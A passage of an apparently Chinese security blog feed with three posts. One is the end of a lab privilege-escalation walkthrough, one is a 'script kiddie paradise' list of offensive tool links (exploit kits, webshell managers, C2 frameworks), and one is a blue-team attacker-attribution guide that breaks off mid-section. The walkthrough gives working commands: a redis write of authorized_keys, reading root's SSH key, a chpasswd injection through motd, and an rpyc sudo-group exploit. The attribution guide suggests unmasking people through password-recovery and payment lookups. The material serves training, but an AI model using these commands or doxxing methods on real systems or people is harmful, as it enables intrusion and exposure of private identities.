默认侦听端口为5600</p><p><strong>8.检测系统内账号目录或者敏感目录下有没有定时任务，</strong>可以使用pspy工具监视操作系统进程的创建活动，查看是否有定时任务执行或者可以定时执行带root权限的脚本，尝试将反弹语句写入到脚本中</p><p><strong>9.利用linux自带的命令进行漏洞提权</strong> 详细查询网站：</p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><p>Sudo提权漏洞CVE-2021-3156 Sudo 1.8.2-31p2，Sudo 1.9.0-5p1 </p><p>影响的Linux版本：Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 Debian 10.0</p><p><strong>10.利用motd（message of the day）进行提权</strong>,motd是一个访问运行脚本的目录，尝试对找到的进程进行注入echo ‘root:123’ | chpasswd</p><p><strong>11.利用redis进行提权：</strong></p><p>cd .ssh</p><p>.ssh$ nc -nvlp 4444 &gt; authorized_keys</p><p>ssh-keygen -t rsa</p><p>cd .ssh</p><p>nc 10.1.8.138 4444&lt; id_rsa.pub -w 1</p><p>ssh登录账号成功</p><p>redis-cli -a 密码登录成功</p><p>/.ssh$ (echo -e “\n\n”; cat authorized_keys;echo -e “\n\n”) &gt; pub.txt</p><p>cat pub.txt | redis-cli -a 密码 -x set ssh_key</p><p>再次登录 config set dir /root/.ssh</p><p>config set dbfilename “authorized_keys”</p><p>Save</p><p><strong>12.读取root账号的公私钥进行提权</strong>：</p><p>去读取root账号的公私钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tarS -cvf k.tar /root/.ssh/id_rsa</span><br><span class="line">tar -xvf k.tar</span><br><span class="line">ssh -i id_rsa root@localhost -p 2082</span><br></pre></td></tr></table></figure><p><strong>13.rpyc远程管理进行提权 添加sudo权限的exp</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import rpyc</span><br><span class="line">def shell():</span><br><span class="line">import os</span><br><span class="line">os.system(“sudo usermod -a -G sudo ragnar”)</span><br><span class="line">conn = rpyc.classic.connect(“localhost”)</span><br><span class="line">fn=conn.teleport(shell)</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure><h1 id="四．总结"><a href="#四．总结" class="headerlink" title="四．总结"></a><strong>四．总结</strong></h1><p>在打靶过程中一定需要注意信息收集的仔细，细节之处有时就包括有没有ls -la查看到某个隐藏的文件，或者路径爆破是不是少了某个关键的路径</p><p>建议使用高质量的字典来进行扫描，要善于使用nday进行打点，突破边界之后的提权也需要仔细的信息收集</p><p>查看一些敏感的账号目录与命令操作历史，不能放过每一个细节</p><p>原文地址：<a href="https://www.freebuf.com/articles/web/339942.html">https://www.freebuf.com/articles/web/339942.html</a></p><p><strong>声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。****所有渗透都需获取授权</strong>！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一．对靶机进行信息收集&quot;&gt;&lt;a href=&quot;#一．对靶机进行信息收集&quot; class=&quot;headerlink&quot; title=&quot;一．对靶机进行信息收集&quot;&gt;&lt;/a&gt;&lt;strong&gt;一．对靶机进行信息收集&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.首先对目标存活</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>脚本小子天堂</title>
    <link href="http://example.com/2022/11/02/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E5%A4%A9%E5%A0%82/"/>
    <id>http://example.com/2022/11/02/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E5%A4%A9%E5%A0%82/</id>
    <published>2022-11-02T03:01:54.000Z</published>
    <updated>2022-11-02T03:03:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="脚本小子天堂"><a href="#脚本小子天堂" class="headerlink" title="脚本小子天堂~"></a>脚本小子天堂~</h1><h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><h3 id="移动端信息收集"><a href="#移动端信息收集" class="headerlink" title="移动端信息收集"></a>移动端信息收集</h3><p>AppInfoScanner <a href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>dirsearch 目录扫描工具 <a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p>feroxbuster 目录扫描工具 <a href="https://github.com/epi052/feroxbuster">https://github.com/epi052/feroxbuster</a></p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>ObserverWard 指纹识别工具 <a href="https://github.com/0x727/ObserverWard">https://github.com/0x727/ObserverWard</a></p><p>ObserverWard 指纹识别工具 <a href="https://github.com/0x727/ObserverWard">https://github.com/0x727/ObserverWard</a></p><p>EHole（棱洞）3.0 指纹探测工具 <a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><p>OneForAll 子域收集工具 <a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>Naabu 端口扫描 <a href="https://github.com/projectdiscovery/naabu">https://github.com/projectdiscovery/naabu</a></p><h3 id="接口探测"><a href="#接口探测" class="headerlink" title="接口探测"></a>接口探测</h3><p>URLFinder <a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a></p><h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h3><p>.git文件泄露 <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>trufflehog敏感信息检测 <a href="https://github.com/trufflesecurity/trufflehog">https://github.com/trufflesecurity/trufflehog</a></p><p>ihoneyBakFileScan 备份文件泄露扫描 <a href="https://github.com/VMsec/ihoneyBakFileScan_Modify">https://github.com/VMsec/ihoneyBakFileScan_Modify</a></p><h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><p>cloudflare绕过查找ip <a href="https://github.com/christophetd/CloudFlair">https://github.com/christophetd/CloudFlair</a></p><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>Payer轻量级快速探测子域名 <a href="https://github.com/Pik-sec/Payer">https://github.com/Pik-sec/Payer</a></p><p>ksubdomain子域名爆破 <a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></p><p>subDomainsBrute子域名爆破 <a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p><h3 id="空间测绘"><a href="#空间测绘" class="headerlink" title="空间测绘"></a>空间测绘</h3><p>fofa_viewer fofa图形化查询 <a href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a></p><h2 id="0x01-web集成化工具"><a href="#0x01-web集成化工具" class="headerlink" title="0x01 web集成化工具"></a>0x01 web集成化工具</h2><p>AsamF 资产收集工具 <a href="https://github.com/Kento-Sec/AsamF">https://github.com/Kento-Sec/AsamF</a></p><p>MYExploit 综合利用工具 <a href="https://github.com/achuna33/MYExploit">https://github.com/achuna33/MYExploit</a></p><p>railgun 渗透集成化工具 <a href="https://github.com/lz520520/railgun">https://github.com/lz520520/railgun</a></p><p>ARL 资产侦察灯塔 <a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><p>GOBY网络安全测试工具 <a href="https://github.com/gobysec/Goby">https://github.com/gobysec/Goby</a></p><p>YAKIT 网络安全单兵工具 <a href="https://github.com/yaklang/yakit">https://github.com/yaklang/yakit</a></p><p>shuize（水泽） 信息收集 <a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a></p><h2 id="0x02-web漏洞利用"><a href="#0x02-web漏洞利用" class="headerlink" title="0x02 web漏洞利用"></a>0x02 web漏洞利用</h2><p>Webshell管理 <a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p><p>aliyun-accesskey-Tools <a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a></p><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>Komo信息收集与漏洞利用 <a href="https://github.com/komomon/Komo">https://github.com/komomon/Komo</a></p><p>afrog快速打点漏洞扫描 <a href="https://github.com/zan8in/afrog">https://github.com/zan8in/afrog</a></p><p>AutoPWN-Suite漏洞扫描器 <a href="https://github.com/GamehunterKaan/AutoPWN-Suite">https://github.com/GamehunterKaan/AutoPWN-Suite</a></p><p>scan4all漏洞扫描 <a href="https://github.com/hktalent/scan4all">https://github.com/hktalent/scan4all</a></p><p>POC-bomber 漏洞扫描器 <a href="https://github.com/tr0uble-mAker/POC-bomber">https://github.com/tr0uble-mAker/POC-bomber</a></p><p>EasyPen 综合利用工具 <a href="https://github.com/lijiejie/EasyPen">https://github.com/lijiejie/EasyPen</a></p><p>Exphub 漏洞利用脚本 <a href="https://github.com/zhzyker/exphub">https://github.com/zhzyker/exphub</a></p><p>nuclei 漏洞扫描器 <a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p><p>一款功能强大的安全评估工具Xray <a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></p><p>afrog 是一款性能卓越、快速稳定、PoC 可定制化的漏洞扫描工具 <a href="https://github.com/zan8in/afrog">https://github.com/zan8in/afrog</a></p><p>是一款 web 漏洞扫描和验证工具vulmap <a href="https://github.com/zhzyker/vulmap">https://github.com/zhzyker/vulmap</a></p><h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3><p>dalfox xss漏洞扫描器 <a href="https://github.com/hahwul/dalfox">https://github.com/hahwul/dalfox</a></p><h3 id="中间件漏洞利用"><a href="#中间件漏洞利用" class="headerlink" title="中间件漏洞利用"></a>中间件漏洞利用</h3><p>JNDI-Inject-Exploit注入 <a href="https://github.com/exp1orer/JNDI-Inject-Exploit">https://github.com/exp1orer/JNDI-Inject-Exploit</a></p><p>jndi_tool注入工具 <a href="https://github.com/wyzxxz/jndi_tool">https://github.com/wyzxxz/jndi_tool</a></p><p>JNDIExploit注入工具 <a href="https://github.com/0x727/JNDIExploit">https://github.com/0x727/JNDIExploit</a></p><p>Spring系列漏洞利用工具 <a href="https://github.com/SummerSec/SpringExploit">https://github.com/SummerSec/SpringExploit</a></p><p>SpringBootExploit <a href="https://github.com/0x727/SpringBootExploit">https://github.com/0x727/SpringBootExploit</a></p><p>Springboot漏洞全家桶 <a href="https://github.com/woodpecker-appstore/springboot-vuldb">https://github.com/woodpecker-appstore/springboot-vuldb</a></p><p>shiro反序列化漏洞综合利用,包含（回显执行命令/注入内存马）修复原版中NoCC的问题 <a href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p><p>shiro反序列化漏洞综合利用,包含（回显执行命令/注入内存马） <a href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p><p>Cloud-Bucket-Leak-Detection-Tools 云储存利用工具 <a href="https://github.com/UzJu/Cloud-Bucket-Leak-Detection-Tools">https://github.com/UzJu/Cloud-Bucket-Leak-Detection-Tools</a></p><p>Log4j2Scan <a href="https://github.com/whwlsfb/Log4j2Scan">https://github.com/whwlsfb/Log4j2Scan</a></p><p>ShiroExploit <a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p><p>ShiroAttack2 <a href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p><p>thinkphp_gui_tools <a href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a></p><p>Fastjson-Patrol <a href="https://github.com/ce-automne/FastjsonPatrol">https://github.com/ce-automne/FastjsonPatrol</a></p><h3 id="cms漏洞"><a href="#cms漏洞" class="headerlink" title="cms漏洞"></a>cms漏洞</h3><p>泛微oa综合利用脚本 <a href="https://github.com/z1un/weaver_exp">https://github.com/z1un/weaver_exp</a></p><p>蓝凌OA漏洞利用工具/前台无条件RCE/文件写入 <a href="https://github.com/yuanhaiGreg/LandrayExploit">https://github.com/yuanhaiGreg/LandrayExploit</a></p><p>致远OA综合利用工具 <a href="https://github.com/Summer177/seeyon_exp">https://github.com/Summer177/seeyon_exp</a></p><p>致远OA综合利用工具GUI-V1.0 <a href="https://github.com/God-Ok/SeeyonExploit-GUI">https://github.com/God-Ok/SeeyonExploit-GUI</a></p><p>通达OA综合利用工具 <a href="https://github.com/xinyu2428/TDOA_RCE">https://github.com/xinyu2428/TDOA_RCE</a></p><h2 id="0x03-内网信息收集"><a href="#0x03-内网信息收集" class="headerlink" title="0x03 内网信息收集"></a>0x03 内网信息收集</h2><p>mscan域内网扫描 <a href="https://github.com/ddostest123/mscan">https://github.com/ddostest123/mscan</a></p><p>ALLiN 扫描工具 <a href="https://github.com/P1-Team/AlliN">https://github.com/P1-Team/AlliN</a></p><p>SharpHostInfo 内网主机探测 <a href="https://github.com/shmilylty/SharpHostInfo">https://github.com/shmilylty/SharpHostInfo</a></p><p>内网扫描fscan <a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><h2 id="0x04-内网漏洞利用"><a href="#0x04-内网漏洞利用" class="headerlink" title="0x04 内网漏洞利用"></a>0x04 内网漏洞利用</h2><h3 id="钓鱼框架"><a href="#钓鱼框架" class="headerlink" title="钓鱼框架"></a>钓鱼框架</h3><p>Goblin 钓鱼演练工具 <a href="https://github.com/xiecat/goblin">https://github.com/xiecat/goblin</a></p><h3 id="C2框架"><a href="#C2框架" class="headerlink" title="C2框架"></a>C2框架</h3><p>manjusakaC2框架 <a href="https://github.com/YDHCUI/manjusaka">https://github.com/YDHCUI/manjusaka</a></p><p>c2流量前置 <a href="https://github.com/wikiZ/RedGuard/">https://github.com/wikiZ/RedGuard/</a></p><p>AtlasC2 C2框架Atlas <a href="https://github.com/Gr1mmie/AtlasC2">https://github.com/Gr1mmie/AtlasC2</a></p><p>Malleable C2 Profiles <a href="https://github.com/xx0hcd/Malleable-C2-Profiles">https://github.com/xx0hcd/Malleable-C2-Profiles</a></p><h3 id="提权工具"><a href="#提权工具" class="headerlink" title="提权工具"></a>提权工具</h3><p>PEASS-ng 提权套装 <a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p>Traitor 提权工具 <a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></p><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p>Stowaway 内网穿透 <a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p><p>Dog Tunnel(狗洞)端口映射工具 <a href="https://github.com/vzex/dog-tunnel">https://github.com/vzex/dog-tunnel</a></p><p>frp 端口映射工具 <a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>iox 端口转发多层内网 <a href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p><h2 id="0x05-云渗透"><a href="#0x05-云渗透" class="headerlink" title="0x05 云渗透"></a>0x05 云渗透</h2><p>CF 云环境利用框架 <a href="https://github.com/teamssix/cf">https://github.com/teamssix/cf</a></p><h2 id="0x06-每日文章收集"><a href="#0x06-每日文章收集" class="headerlink" title="0x06 每日文章收集"></a>0x06 每日文章收集</h2><p><a href="https://f5.pm/">https://f5.pm</a></p><h2 id="0x07-在线api调试"><a href="#0x07-在线api调试" class="headerlink" title="0x07 在线api调试"></a>0x07 在线api调试</h2><p><a href="https://v7.apipost.cn/apis#/apis/run">https://v7.apipost.cn/apis#/apis/run</a></p><h2 id="0x08-在线木马分析"><a href="#0x08-在线木马分析" class="headerlink" title="0x08 在线木马分析"></a>0x08 在线木马分析</h2><p><a href="https://app.any.run/submissions/">https://app.any.run/submissions/</a></p><h2 id="0x09-在线工具大全"><a href="#0x09-在线工具大全" class="headerlink" title="0x09 在线工具大全"></a>0x09 在线工具大全</h2><p><a href="https://www.toolnb.com/">https://www.toolnb.com/</a></p><h2 id="0x10-DNSlog"><a href="#0x10-DNSlog" class="headerlink" title="0x10 DNSlog"></a>0x10 DNSlog</h2><p><a href="http://dnslog.cn/">http://dnslog.cn/</a></p><p><a href="https://dig.pm/">https://dig.pm/</a></p><h2 id="0x11-匿名上传、下载"><a href="#0x11-匿名上传、下载" class="headerlink" title="0x11 匿名上传、下载"></a>0x11 匿名上传、下载</h2><p><a href="https://pan.xj.hk/">https://pan.xj.hk/</a></p><p><a href="https://www.wenshushu.cn/">https://www.wenshushu.cn/</a></p><p><a href="https://wormhole.app/">https://wormhole.app/</a></p><p><a href="https://airportal.cn/">https://airportal.cn/</a></p><p><a href="https://transfer.sh/">https://transfer.sh/</a></p><h2 id="0x12-在线游戏机"><a href="#0x12-在线游戏机" class="headerlink" title="0x12 在线游戏机"></a>0x12 在线游戏机</h2><p><a href="https://www.yikm.net/">https://www.yikm.net/</a></p><h2 id="0X13-SQL沙箱"><a href="#0X13-SQL沙箱" class="headerlink" title="0X13 SQL沙箱"></a>0X13 SQL沙箱</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p><a href="http://sqlfiddle.com/#!9">http://sqlfiddle.com/#!9</a></p><p><a href="http://rextester.com/l/mysql_online_compiler">http://rextester.com/l/mysql_online_compiler</a></p><p><a href="https://www.tutorialspoint.com/mysql_terminal_online.php">https://www.tutorialspoint.com/mysql_terminal_online.php</a></p><p><a href="https://www.jdoodle.com/online-mysql-terminal">https://www.jdoodle.com/online-mysql-terminal</a></p><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p><a href="http://sqlfiddle.com/#!4">http://sqlfiddle.com/#!4</a></p><p><a href="https://livesql.oracle.com/apex/livesql/file/index.html">https://livesql.oracle.com/apex/livesql/file/index.html</a></p><p><a href="https://www.tutorialspoint.com/oracle_terminal_online.php">https://www.tutorialspoint.com/oracle_terminal_online.php</a></p><h3 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h3><p><a href="http://sqlfiddle.com/#!6">http://sqlfiddle.com/#!6</a></p><p><a href="https://turbo.net/sql">https://turbo.net/sql</a></p><p><a href="https://sqlzoo.net/">https://sqlzoo.net/</a></p><p><a href="http://www.headfirstlabs.com/sql_hands_on/">http://www.headfirstlabs.com/sql_hands_on/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;脚本小子天堂&quot;&gt;&lt;a href=&quot;#脚本小子天堂&quot; class=&quot;headerlink&quot; title=&quot;脚本小子天堂~&quot;&gt;&lt;/a&gt;脚本小子天堂~&lt;/h1&gt;&lt;h2 id=&quot;0x00-信息收集&quot;&gt;&lt;a href=&quot;#0x00-信息收集&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="工具" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>HW蓝队溯源流程详细整理分享</title>
    <link href="http://example.com/2022/09/29/HW%E8%93%9D%E9%98%9F%E6%BA%AF%E6%BA%90%E6%B5%81%E7%A8%8B%E8%AF%A6%E7%BB%86%E6%95%B4%E7%90%86%E5%88%86%E4%BA%AB/"/>
    <id>http://example.com/2022/09/29/HW%E8%93%9D%E9%98%9F%E6%BA%AF%E6%BA%90%E6%B5%81%E7%A8%8B%E8%AF%A6%E7%BB%86%E6%95%B4%E7%90%86%E5%88%86%E4%BA%AB/</id>
    <published>2022-09-29T05:24:10.000Z</published>
    <updated>2022-12-04T14:20:40.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景："><a href="#背景：" class="headerlink" title="背景："></a><strong>背景：</strong></h2><p>授权授权攻防演练过程中，攻击者千方百计使用各种方法渗透目标。一般情况下攻击链包括：侦察、武器化、交付、利用、安装、命令和控制、窃取目标数据。在溯源中，安全人员对攻击者某个阶段的攻击特点进行分析，再结合已掌握的威胁情报数据将攻击特点和数据聚类，能够有效掌握攻击者的攻击手法和 IP 、域名资产等。</p><h2 id="目标："><a href="#目标：" class="headerlink" title="目标："></a><strong>目标：</strong></h2><p>掌握攻击者的攻击手法（例如：特定木马、武器投递方法）；<br>掌握攻击者的 IP域名资产（例如：木马 C2、木马存放站点、资产特点）；<br>掌握攻击者的虚拟身份、身份；<br>掌握攻击者武器的检测或发现方法，将捕获的数据形成新的线索。</p><h2 id="方法论："><a href="#方法论：" class="headerlink" title="方法论："></a><strong>方法论：</strong></h2><p>针对交付、利用、安装、命令和控制四个阶段捕获到的数据做深度分析，聚类提取数据特点形成规则。将规则应用于一些安全设备产出高可信度的告警用于防御，或者结合情报数据（如样本信息、域名信息、IP 信息等），将深度溯源的情报（如身份信息、攻击队伍等）产出。</p><h3 id="1-攻击链部分可溯源的关键点："><a href="#1-攻击链部分可溯源的关键点：" class="headerlink" title="1. 攻击链部分可溯源的关键点："></a>1. 攻击链部分可溯源的关键点：</h3><p><img src="https://s1.ax1x.com/2022/12/04/zsWzYn.png" alt="1670163261658"></p><h3 id="2-攻击链利用阶段可溯源的方法及利用点："><a href="#2-攻击链利用阶段可溯源的方法及利用点：" class="headerlink" title="2. 攻击链利用阶段可溯源的方法及利用点："></a>2. 攻击链利用阶段可溯源的方法及利用点：</h3><p><img src="https://s1.ax1x.com/2022/12/04/zsfiOU.png" alt="image"></p><p>攻击回溯的关键点主要分为两类:</p><p>攻击分类：根据攻击者的漏洞利用数据包特点（如：字符串格式、特殊字符串）。<br>攻击者信息：攻击者使用其公司（个人）特有的漏洞利用工具时，可能会在请求包中存在公司（个人）信息。</p><h3 id="3-钓鱼邮件可溯源方法及关键点："><a href="#3-钓鱼邮件可溯源方法及关键点：" class="headerlink" title="3. 钓鱼邮件可溯源方法及关键点："></a>3. 钓鱼邮件可溯源方法及关键点：</h3><p><img src="https://s1.ax1x.com/2022/12/04/zsfAw4.png" alt="image"></p><p>发件 IP、发件账号、邮件内容（格式特点等）可用于将攻击者投递的邮件分类；</p><p>发件账号中可能存在个人信息，如：“账号@qq.com”、“昵称@gmail.com” 等此类字符串，检索该字符串可用于挖掘身份信息；</p><p>邮件内容大致可分以下三类：</p><p>投递物（后门木马、其他攻击组件）</p><p>钓鱼网站，包含域名、IP 等信息</p><p>其他，需要研究邮件中的字符串，邮件可能存在攻击者的其他账号（在真实场景中出现过）发件 IP、发件服务器，属攻击者资产。</p><h3 id="4-后门木马可溯源方法及关键点："><a href="#4-后门木马可溯源方法及关键点：" class="headerlink" title="4. 后门木马可溯源方法及关键点："></a>4. 后门木马可溯源方法及关键点：</h3><p><img src="https://s1.ax1x.com/2022/12/04/zsfeYR.png" alt="image"></p><p>代码逻辑，由于人的惰性，红队开发者可能会复用以前的一些代码。如代码特点比较明显，可用于分类和拓线。</p><p>字符串特点，用于将红队投递的样本分类和拓线更多的样本，将检索到的样本再进行分析，分析历史样本（如测试阶段的样本）看是否会暴露出更多信息。</p><p>元数据（投递的诱饵不同，得到的元数据不同。诱饵类型包括：LNK、EXE、DOCX等）。</p><p>EXE 文件：存在 PDB 信息，部分开发人员将项目存放在桌面，这会导致编译信息带入开发人员的终端名称（极大可能为个人昵称）。</p><p>LNK 文件：由于 LNK 文件在新建的时候会带入计算机名称，这可以用于样本的拓线和分类，极少情况下可找到个人昵称。</p><p>DOCX 文件：可能存在“最后编辑者名称”。</p><p>回连 C2，属攻击者资产。</p><h3 id="5-攻击者资产维度可溯源方法及关键点"><a href="#5-攻击者资产维度可溯源方法及关键点" class="headerlink" title="5. 攻击者资产维度可溯源方法及关键点:"></a>5. 攻击者资产维度可溯源方法及关键点:</h3><p><img src="https://s1.ax1x.com/2022/12/04/zsfmf1.png" alt="image"></p><p>域名自身特点，如：昵称字符串</p><p>搭建网站（通过图中四种方法探测资产的现有数据和历史数据）</p><ol><li>网站可能存在红队的其他攻击组件</li><li>网站存在个人昵称、简介等</li><li>网站备案信息</li></ol><p>Whois 信息，可能包含：注册者邮箱、电话号码等</p><p>IP 信息需要考虑如下两点：</p><ol><li>是否定位到某个安全公司的地理位置</li><li>是否标记为某个安全公司的网关</li></ol><h3 id="6-命令和控制阶段可产生的数据"><a href="#6-命令和控制阶段可产生的数据" class="headerlink" title="6.命令和控制阶段可产生的数据"></a>6.命令和控制阶段可产生的数据</h3><p><img src="https://s1.ax1x.com/2022/12/04/zsfM6K.png" alt="image"></p><p>用于防御，将掌握的流量规则部署在安全设备中积累数据，掌握更多的木马、资产，支撑上述中的各种溯源方法</p><h3 id="7-身份信息溯源方向："><a href="#7-身份信息溯源方向：" class="headerlink" title="7.身份信息溯源方向："></a>7.身份信息溯源方向：</h3><p><img src="https://s1.ax1x.com/2022/12/04/zsfJkd.md.png" alt="image"></p><p><strong>虚拟身份</strong></p><p>攻击者资产暴露的信息，如：Whois 信息、个人网站简介、GitHub 个人简介</p><p>样本暴露的信息，如：PDB 信息、个人昵称、存放特马的 Github 账号</p><p>蜜罐捕获，如：百度 ID、新浪 ID 等</p><p>利用密码找回功能，如：阿里云IP找回、腾讯密码找回、邮箱密码找回</p><p><strong>身份</strong></p><p>社交平台（如百度贴吧、QQ 空间、新浪微博等）暴露真实姓名、手机号码</p><p>支付宝转账功能，搜索邮箱、手机号</p><p>已知的线索（邮箱、QQ、昵称等）在招聘网站搜索</p><p>利用搜索引擎，如：手机号和真实姓名存放一起的 XXX 学校表格</p><p><strong>公司信息</strong></p><p>IP资产定位、域名 Whois 信息</p><p>特有漏洞利用工具暴露的信息，如：User Agent、Cookie、Payload</p><p>社交平台，如：钉钉、企业微信等</p><p>攻击者个人简历中的工作经历</p><h2 id="流程："><a href="#流程：" class="headerlink" title="流程："></a><strong>流程：</strong></h2><h3 id="1-针对ip通过开源情报-开放端口分析查询"><a href="#1-针对ip通过开源情报-开放端口分析查询" class="headerlink" title="1.针对ip通过开源情报+开放端口分析查询"></a>1.针对ip通过开源情报+开放端口分析查询</h3><p>可利用网站：</p><p><a href="https://x.threatbook.cn/%EF%BC%88%E4%B8%BB%E8%A6%81%EF%BC%89">https://x.threatbook.cn/（主要）</a></p><p><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></p><p><a href="https://ti.360.cn/%EF%BC%88%E4%B8%BB%E8%A6%81%EF%BC%89">https://ti.360.cn/（主要）</a></p><p><a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></p><p><a href="https://community.riskiq.com/">https://community.riskiq.com/</a></p><p>当发现某些IP的攻击后，可以尝试通过此IP去溯源攻击者</p><p>首先通过<a href="http://www.ipip.net网站或者其他接口,查询此ip为idc的ip、cdn的ip还是普通运营商的出口ip./">http://www.ipip.net网站或者其他接口，查询此IP为IDC的IP、CDN的IP还是普通运营商的出口IP。</a></p><p>如果IP反查到域名就可以去站长之家对其进行whois反查或者去<a href="https://whois.domaintools.com/%E7%AD%89%E7%BD%91%E7%AB%99%E5%8E%BB%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%90%8D%E7%9A%84%E6%B3%A8%E5%86%8C%E4%BF%A1%E6%81%AF%E3%80%81http://whoissoft.com/%E6%9F%A5%E8%AF%A2%E5%A4%87%E6%A1%88%E4%BF%A1%E6%81%AF%E7%AD%89%E3%80%82">https://whois.domaintools.com/等网站去查询域名的注册信息、http://whoissoft.com/查询备案信息等。</a></p><p>端口：可查看开放服务进行进一步利用</p><p>可考虑使用masscan快速查看开放端口：</p><p>masscan -p 1-65535 ip –rate=500</p><p>再通过nmap 对开放端口进行识别</p><p>nmap -p 3389,3306,6378 -Pn IP</p><p>发现相关有用端口，进行端口相关漏洞的挖掘及利用。</p><h3 id="2-ip查询定位"><a href="#2-ip查询定位" class="headerlink" title="2.ip查询定位"></a>2.ip查询定位</h3><p>ip定位工具：</p><p>高精度IP定位：<a href="https://www.opengps.cn/Data/IP/LocHighAcc.aspx">https://www.opengps.cn/Data/IP/LocHighAcc.aspx</a></p><p>rtbasia（IP查询）：<a href="https://ip.rtbasia.com/">https://ip.rtbasia.com/</a></p><p>ipplus360（IP查询）：<a href="https://www.ipplus360.com/">https://www.ipplus360.com/</a></p><p>IP地址查询在线工具：<a href="https://tool.lu/ip/">https://tool.lu/ip/</a></p><p>在通过IP定位技术溯源过程，应注意以下情况：</p><p>假如IP反查到的域名过多，考虑就是CDN了，就没必要继续去查了。</p><p>假如是普通运营商的出口IP只能使用一些高精度IP定位工具粗略估计攻击者的地址，如果需要具体定位到人，则需要更多的信息。</p><h3 id="3-ID跟踪、得到常用id信息收集"><a href="#3-ID跟踪、得到常用id信息收集" class="headerlink" title="3. ID跟踪、得到常用id信息收集"></a>3. 